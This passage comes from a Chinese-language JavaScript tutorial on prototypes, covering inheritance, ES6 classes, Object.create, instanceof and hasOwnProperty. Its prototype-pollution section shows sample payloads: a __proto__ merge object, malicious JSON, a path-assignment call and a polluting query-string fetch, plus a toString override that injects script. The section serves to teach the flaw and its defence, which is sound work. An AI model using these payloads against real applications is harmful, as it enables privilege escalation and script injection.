breed;<br>&#125;<br><br><span class="hljs-comment">// 继承</span><br><span class="hljs-title function_">inheritPrototype</span>(<span class="hljs-title class_">Dog</span>, <span class="hljs-title class_">Animal</span>);<br><br><span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">bark</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Woof!&#x27;</span>);<br>&#125;;<br><br><span class="hljs-comment">// 使用</span><br><span class="hljs-keyword">const</span> myDog = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&#x27;Max&#x27;</span>, <span class="hljs-string">&#x27;Labrador&#x27;</span>);<br>myDog.<span class="hljs-title function_">sayName</span>(); <span class="hljs-comment">// &quot;Max&quot;</span><br>myDog.<span class="hljs-title function_">bark</span>();    <span class="hljs-comment">// &quot;Woof!&quot;</span><br></code></pre></td></tr></table></figure><p><strong>优势</strong></p><ul><li>只调用一次父类构造函数</li><li>原型链保持不变</li><li>能够正常使用 instanceof 和 isPrototypeOf</li></ul><h2 id="5-4-ES6-class-语法与原型链的关系"><a href="#5-4-ES6-class-语法与原型链的关系" class="headerlink" title="5.4 ES6 class 语法与原型链的关系"></a>5.4 ES6 <code>class</code> 语法与原型链的关系</h2><p><strong>代码实现</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  &#125;<br>  <br>  <span class="hljs-title function_">getName</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Animal</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name, breed</span>) &#123;<br>    <span class="hljs-variable language_">super</span>(name); <span class="hljs-comment">// 调用父类构造函数</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">breed</span> = breed;<br>  &#125;<br>  <br>  <span class="hljs-title function_">bark</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Woof!&#x27;</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> myDog = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&#x27;Buddy&#x27;</span>, <span class="hljs-string">&#x27;Golden Retriever&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myDog.<span class="hljs-title function_">getName</span>()); <span class="hljs-comment">// &quot;Buddy&quot;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myDog.<span class="hljs-title function_">bark</span>());    <span class="hljs-comment">// &quot;Woof!&quot;</span><br></code></pre></td></tr></table></figure><p><strong>注意</strong></p><ul><li>这本质上是语法糖，底层仍然是基于原型的继承</li><li>extends 关键字自动设置了原型链</li><li>super() 必须在使用 this 之前调用</li></ul><h1 id="第六章：原型相关方法与操作"><a href="#第六章：原型相关方法与操作" class="headerlink" title="第六章：原型相关方法与操作"></a>第六章：原型相关方法与操作</h1><h2 id="6-1-Object-create-与纯净对象"><a href="#6-1-Object-create-与纯净对象" class="headerlink" title="6.1 Object.create() 与纯净对象"></a>6.1 <code>Object.create()</code> 与纯净对象</h2><p>Object.create 是 JavaScript 中创建新对象的方法，它允许你明确指定新对象的原型</p><p><strong>基本语法</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(proto[, propertiesObject])<br></code></pre></td></tr></table></figure><ul><li>proto：新创建对象的原型对象（必须为对象或 null）</li><li>propertiesObject（可选）：属性描述符集合（同 Object.defineProperties() 的第二个参数）</li></ul><p><strong>纯净对象</strong></p><p>纯净对象是指没有原型链（<code>__proto__</code>为 null）的对象，创建方式：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> pureObject = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br></code></pre></td></tr></table></figure><p>其特点有：</p><ul><li>无原型，防止污染</li><li>无任何默认属性和方法</li><li>属性查找更快，只需查找自身属性</li><li>更安全的属性存储</li></ul><h2 id="6-2-Object-getPrototypeOf-和-Object-setPrototypeOf"><a href="#6-2-Object-getPrototypeOf-和-Object-setPrototypeOf" class="headerlink" title="6.2 Object.getPrototypeOf() 和 Object.setPrototypeOf()"></a>6.2 <code>Object.getPrototypeOf()</code> 和 <code>Object.setPrototypeOf()</code></h2><p><strong>基本概念</strong></p><ul><li>Object.getPrototypeOf() 方法用于获取指定对象的原型（即内部 [[Prototype]] 属性的值）</li><li>Object.setPrototypeOf() 方法设置一个指定对象的原型（即内部 [[Prototype]] 属性）到另一个对象或 null。</li></ul><p><strong>语法和参数</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(obj)<br><span class="hljs-comment">// obj：要获取其原型的对象，注意，如果参数不是对象，会强制转为对象</span><br><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">setPrototypeOf</span>(obj, prototype)<br><span class="hljs-comment">// obj：要设置其原型的对象</span><br><span class="hljs-comment">// prototype：该对象的新原型（必须为对象或 null）</span><br></code></pre></td></tr></table></figure><p><strong>返回值</strong></p><ul><li>Object.getPrototypeOf()：返回给定对象的原型（可能是对象或 null）</li><li>Object.setPrototypeOf()：返回设置新原型后的对象</li></ul><h2 id="6-3-instanceof-的原理与局限性"><a href="#6-3-instanceof-的原理与局限性" class="headerlink" title="6.3 instanceof 的原理与局限性"></a>6.3 <code>instanceof</code> 的原理与局限性</h2><p>instanceof 是 JavaScript 中用于检查对象原型链的操作符，其核心功能是检查构造函数的 prototype 属性是否出现在对象的原型链上</p><p><strong>语法</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">object <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Constructor</span><br></code></pre></td></tr></table></figure><p><strong>内部实现机制</strong></p><p>instanceof 的底层行为可以用以下伪代码表示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">instanceOf</span>(<span class="hljs-params">obj, Constructor</span>) &#123;<br>  <span class="hljs-comment">// 获取对象的原型</span><br>  <span class="hljs-keyword">let</span> proto = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(obj);<br>  <br>  <span class="hljs-comment">// 获取构造函数的 prototype 对象</span><br>  <span class="hljs-keyword">const</span> prototype = <span class="hljs-title class_">Constructor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>;<br>  <br>  <span class="hljs-comment">// 沿着原型链向上查找</span><br>  <span class="hljs-keyword">while</span> (proto !== <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">if</span> (proto === prototype) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    proto = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(proto);<br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>实际示例分析</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params"></span>) &#123;&#125;<br><span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Person</span>); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p>其执行过程为：</p><ol><li>获取 <code>p.__proto__</code>（指向 Person.prototype）</li><li>比较 Person.prototype 和 Person.prototype -&gt; 匹配成功</li></ol><p><strong>主要局限性</strong></p><p>（1）跨执行环境问题（iframe&#x2F;window）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&lt;!-- 主页面 --&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">  <span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params"></span>) &#123;&#125;</span></span><br><span class="language-javascript"><span class="language-xml">  <span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();</span></span><br><span class="language-javascript"><span class="language-xml">  </span></span><br><span class="language-javascript"><span class="language-xml">  <span class="hljs-comment">// 创建iframe并获取其Array构造函数</span></span></span><br><span class="language-javascript"><span class="language-xml">  <span class="hljs-keyword">const</span> iframe = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;iframe&#x27;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">  <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(iframe);</span></span><br><span class="language-javascript"><span class="language-xml">  <span class="hljs-keyword">const</span> <span class="hljs-title class_">IframeArray</span> = iframe.<span class="hljs-property">contentWindow</span>.<span class="hljs-property">Array</span>;</span></span><br><span class="language-javascript"><span class="language-xml">  </span></span><br><span class="language-javascript"><span class="language-xml">  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Person</span>); <span class="hljs-comment">// true</span></span></span><br><span class="language-javascript"><span class="language-xml">  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>([] <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">IframeArray</span>); <span class="hljs-comment">// false</span></span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>原因：不同执行环境有其各自独立的全局对象和构造函数</p><p>（2）原始类型检测不可靠</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;hello&#x27;</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">String</span>); <span class="hljs-comment">// false</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">123</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Number</span>);    <span class="hljs-comment">// false</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-literal">true</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Boolean</span>);  <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><p>原因：原始类型不是对象，除非用包装对象</p><p>（3）构造函数 prototype 被修改</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params"></span>) &#123;&#125;<br><span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br><br><span class="hljs-comment">// 修改原型后</span><br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = &#123;&#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Person</span>); <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><p>（4）对象原型被手动修改</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">A</span>(<span class="hljs-params"></span>) &#123;&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">B</span>(<span class="hljs-params"></span>) &#123;&#125;<br><span class="hljs-keyword">const</span> obj = <span class="hljs-keyword">new</span> <span class="hljs-title function_">A</span>();<br><br><span class="hljs-comment">// 修改原型链</span><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">setPrototypeOf</span>(obj, B.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj <span class="hljs-keyword">instanceof</span> A); <span class="hljs-comment">// false</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj <span class="hljs-keyword">instanceof</span> B); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p>（5）对纯净对象无效</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> pureObj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(pureObj <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Object</span>); <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><h2 id="6-4-hasOwnProperty-与-in-操作符的区别"><a href="#6-4-hasOwnProperty-与-in-操作符的区别" class="headerlink" title="6.4 hasOwnProperty 与 in 操作符的区别"></a>6.4 <code>hasOwnProperty</code> 与 <code>in</code> 操作符的区别</h2><p><strong>核心区别</strong></p><table><thead><tr><th align="left">特性</th><th align="left">hasOwnProperty</th><th align="left">in 操作符</th></tr></thead><tbody><tr><td align="left">检测范围</td><td align="left">仅对象自身属性</td><td align="left">自身属性 + 原型链属性</td></tr><tr><td align="left">继承方法</td><td align="left">来自 Object.prototype</td><td align="left">JavaScript 语言操作符</td></tr><tr><td align="left">对纯净对象</td><td align="left">需要外部调用（Object.prototype.hasOwnProperty.call）</td><td align="left">可直接使用</td></tr><tr><td align="left">ES6+替代方案</td><td align="left">Object.hasOwn()</td><td align="left">Reflect.has()</td></tr></tbody></table><p><strong>深度解析</strong></p><p>（1）hasOwnProperty 实现原理（伪代码）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-params">obj, prop</span>) &#123;<br>  <span class="hljs-comment">// 获取对象的所有自有属性</span><br>  <span class="hljs-keyword">const</span> ownKeys = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertyNames</span>(obj).<span class="hljs-title function_">concat</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertySymbols</span>(obj));<br>  <span class="hljs-keyword">return</span> ownKeys.<span class="hljs-title function_">includes</span>(prop);<br>&#125;<br></code></pre></td></tr></table></figure><p>（2）in 操作符实现原理（伪代码）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">inOperator</span>(<span class="hljs-params">obj, prop</span>) &#123;<br>  <span class="hljs-keyword">while</span> (obj !== <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertyDescriptor</span>(obj, prop)) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    obj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(obj);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>关键差异对比</strong></p><p>（1）原型链处理差异</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params"></span>) &#123;&#125;<br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">name</span> = <span class="hljs-string">&#x27;Proto&#x27;</span>;<br><br><span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>p.<span class="hljs-property">age</span> = <span class="hljs-number">30</span>;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">&#x27;name&#x27;</span>)); <span class="hljs-comment">// false</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;name&#x27;</span> <span class="hljs-keyword">in</span> p);             <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p>（2）属性描述符影响</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> parent = &#123;&#125;;<br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(parent, <span class="hljs-string">&#x27;secret&#x27;</span>, &#123;<br>  <span class="hljs-attr">value</span>: <span class="hljs-number">123</span>,<br>  <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">false</span><br>&#125;);<br><br><span class="hljs-keyword">const</span> child = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(parent);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(child.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">&#x27;secret&#x27;</span>)); <span class="hljs-comment">// false ❗️(正确，非自有属性)</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;secret&#x27;</span> <span class="hljs-keyword">in</span> child);             <span class="hljs-comment">// true ❗️(能检测到继承属性)</span><br></code></pre></td></tr></table></figure><h1 id="第七章：高级原型应用"><a href="#第七章：高级原型应用" class="headerlink" title="第七章：高级原型应用"></a>第七章：高级原型应用</h1><h2 id="7-1-原型污染与安全问题"><a href="#7-1-原型污染与安全问题" class="headerlink" title="7.1 原型污染与安全问题"></a>7.1 原型污染与安全问题</h2><p><strong>基本概念</strong></p><p>原型污染是指攻击者通过某种方式修改 JavaScript 对象的原型（通常是 Object.prototype），从而影响所有基于该原型的对象行为的安全漏洞</p><p><strong>污染原理</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 正常对象</span><br><span class="hljs-keyword">const</span> obj = &#123; <span class="hljs-attr">a</span>: <span class="hljs-number">1</span> &#125;;<br><br><span class="hljs-comment">// 污染原型</span><br><span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">isAdmin</span> = <span class="hljs-literal">true</span>;<br><br><span class="hljs-comment">// 所有对象现在都有isAdmin属性</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">isAdmin</span>); <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(&#123;&#125;.<span class="hljs-property">isAdmin</span>); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p><strong>常见的污染途径</strong></p><p>（1）不安全的对象合并</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> source) &#123;<br>    target[key] = source[key]; <span class="hljs-comment">// 可能覆盖原型属性</span><br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> maliciousPayload = &#123;<br>  <span class="hljs-attr">__proto__</span>: &#123; <span class="hljs-attr">isAdmin</span>: <span class="hljs-literal">true</span> &#125;,<br>  <span class="hljs-attr">constructor</span>: &#123; <span class="hljs-attr">prototype</span>: &#123; <span class="hljs-attr">isAdmin</span>: <span class="hljs-literal">true</span> &#125; &#125;<br>&#125;;<br><br><span class="hljs-title function_">merge</span>(&#123;&#125;, maliciousPayload);<br></code></pre></td></tr></table></figure><p>（2）不安全的 JSON 解析</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> maliciousJSON = <span class="hljs-string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;isAdmin&quot;:true&#125;&#125;&#x27;</span>;<br><span class="hljs-keyword">const</span> obj = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(maliciousJSON); <span class="hljs-comment">// 在某些引擎中会污染原型</span><br></code></pre></td></tr></table></figure><p>（3）路径赋值操作</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">setValue</span>(<span class="hljs-params">obj, path, value</span>) &#123;<br>  <span class="hljs-keyword">const</span> parts = path.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;.&#x27;</span>);<br>  <span class="hljs-keyword">let</span> current = obj;<br>  <br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; parts.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>; i++) &#123;<br>    <span class="hljs-keyword">if</span> (!current[parts[i]]) &#123;<br>      current[parts[i]] = &#123;&#125;;<br>    &#125;<br>    current = current[parts[i]];<br>  &#125;<br>  <br>  current[parts[parts.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>]] = value;<br>&#125;<br><br><span class="hljs-comment">// 攻击者可以传入恶意路径</span><br><span class="hljs-title function_">setValue</span>(&#123;&#125;, <span class="hljs-string">&#x27;__proto__.isAdmin&#x27;</span>, <span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure><p><strong>安全影响分析</strong></p><p>（1）权限提升</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 假设系统检查权限的方式</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">checkPermission</span>(<span class="hljs-params">user</span>) &#123;<br>  <span class="hljs-keyword">if</span> (user.<span class="hljs-property">isAdmin</span>) &#123;<br>    <span class="hljs-title function_">grantAdminAccess</span>();<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 污染后所有用户都变成管理员</span><br><span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">isAdmin</span> = <span class="hljs-literal">true</span>;<br><span class="hljs-title function_">checkPermission</span>(&#123;&#125;); <span class="hljs-comment">// 获得管理员权限</span><br></code></pre></td></tr></table></figure><p>（2）XSS 攻击增强</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 污染toString方法</span><br><span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">toString</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;maliciousCode()&lt;/script&gt;&#x27;</span>;<br>&#125;;<br><br><span class="hljs-comment">// 当系统调用toString时</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">innerHTML</span> = someObject.<span class="hljs-title function_">toString</span>(); <span class="hljs-comment">// 执行恶意代码</span><br></code></pre></td></tr></table></figure><p>（3）服务端漏洞</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 假设Express中有这样的代码</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/user&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (req.<span class="hljs-property">query</span>.<span class="hljs-property">isAdmin</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">sensitiveData</span>();<br>  &#125;<br>&#125;);<br><br><span class="hljs-comment">// 攻击者可以发送污染请求</span><br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/user?__proto__.isAdmin=true&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="7-2-如何防御原型污染？"><a href="#7-2-如何防御原型污染？" class="headerlink" title="7.2 如何防御原型污染？"></a>7.2 如何防御原型污染？</h2><p>（1）使用 Object.create(null)创建纯净对象</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td 